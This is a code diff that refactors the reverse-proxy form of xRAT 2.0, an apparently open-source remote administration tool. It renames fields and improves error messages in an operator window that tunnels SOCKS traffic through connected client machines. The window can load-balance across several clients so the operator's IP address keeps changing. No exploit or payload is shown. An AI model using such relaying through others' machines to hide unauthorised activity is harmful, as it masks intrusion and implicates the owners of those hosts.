@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.ReverseProxy;
@@ -9,33 +8,33 @@ namespace xServer.Forms
 {
     public partial class FrmReverseProxy : Form
     {
-        private readonly Client[] clients;
+        private readonly Client[] _clients;
         private ReverseProxyServer SocksServer { get; set; }
         private delegate void Invoky();
-        private ReverseProxyClient[] OpenConnections;
-        private Timer RefreshTimer;
+        private ReverseProxyClient[] _openConnections;
+        private Timer _refreshTimer;
 
         public FrmReverseProxy(Client[] clients)
         {
             InitializeComponent();
-            this.clients = clients;
+            this._clients = clients;
 
-            for(int i = 0; i < clients.Length; i++)
-                clients[i].Value.FrmProxy = this;
+            foreach (Client t in clients)
+                t.Value.FrmProxy = this;
         }
 
         private void FrmReverseProxy_Load(object sender, EventArgs e)
         {
-            if (clients.Length > 1)
+            if (_clients.Length > 1)
             {
                 this.Text = string.Format("xRAT 2.0 - Reverse Proxy [Load-Balancer is active]");
 
-                lblLoadBalance.Text = "The Load Balancer is active, " + clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
+                lblLoadBalance.Text = "The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
 
             }
-            else if (clients.Length == 1)
+            else if (_clients.Length == 1)
             {
-                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", clients[0].EndPoint.Address.ToString(), clients[0].EndPoint.Port.ToString());
+                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _clients[0].EndPoint.Address.ToString(), _clients[0].EndPoint.Port.ToString());
 
                 lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
             }
@@ -48,18 +47,21 @@ namespace xServer.Forms
                 SocksServer = new ReverseProxyServer();
                 SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                 SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
-                SocksServer.StartServer(clients, "0.0.0.0", (int)nudServerPort.Value);
+                SocksServer.StartServer(_clients, "0.0.0.0", (int)nudServerPort.Value);
                 btnStart.Enabled = false;
                 btnStop.Enabled = true;
 
-                RefreshTimer = new Timer();
-                RefreshTimer.Tick += RefreshTimer_Tick;
-                RefreshTimer.Interval = 100;
-                RefreshTimer.Start();
+                _refreshTimer = new Timer();
+                _refreshTimer.Tick += RefreshTimer_Tick;
+                _refreshTimer.Interval = 100;
+                _refreshTimer.Start();
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                MessageBox.Show(
+                    string.Format(
+                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
+                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 btnStop_Click(sender, null);
             }
         }
@@ -70,8 +72,8 @@ namespace xServer.Forms
             {
                 lock (SocksServer)
                 {
-                    this.OpenConnections = SocksServer.OpenConnections;
-                    LvConnections.VirtualListSize = this.OpenConnections.Length;
+                    this._openConnections = SocksServer.OpenConnections;
+                    LvConnections.VirtualListSize = this._openConnections.Length;
                     LvConnections.Refresh();
                 }
             }
@@ -90,8 +92,8 @@ namespace xServer.Forms
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            if (RefreshTimer != null)
-                RefreshTimer.Stop();
+            if (_refreshTimer != null)
+                _refreshTimer.Stop();
             btnStart.Enabled = true;
             btnStop.Enabled = false;
             if (SocksServer != null)
@@ -110,10 +112,10 @@ namespace xServer.Forms
             //Stop the proxy server if still active
             btnStop_Click(sender, null);
 
-            for (int i = 0; i < clients.Length; i++)
+            for (int i = 0; i < _clients.Length; i++)
             {
-                if (clients[i].Value != null)
-                    clients[i].Value.FrmProxy = null;
+                if (_clients[i].Value != null)
+                    _clients[i].Value.FrmProxy = null;
             }
         }
 
@@ -126,9 +128,9 @@ namespace xServer.Forms
         {
             lock (SocksServer)
             {
-                if (e.ItemIndex < OpenConnections.Length)
+                if (e.ItemIndex < _openConnections.Length)
                 {
-                    ReverseProxyClient Connection = OpenConnections[e.ItemIndex];
+                    ReverseProxyClient Connection = _openConnections[e.ItemIndex];
 
                     e.Item = new ListViewItem(new string[]
                     {
@@ -156,12 +158,12 @@ namespace xServer.Forms
 
                     foreach (int index in items)
                     {
-                        if (index < OpenConnections.Length)
+                        if (index < _openConnections.Length)
                         {
-                            ReverseProxyClient Connection = OpenConnections[index];
-                            if (Connection != null)
+                            ReverseProxyClient connection = _openConnections[index];
+                            if (connection != null)
                             {
-                                Connection.Disconnect();
+                                connection.Disconnect();
                             }
                         }
                     }
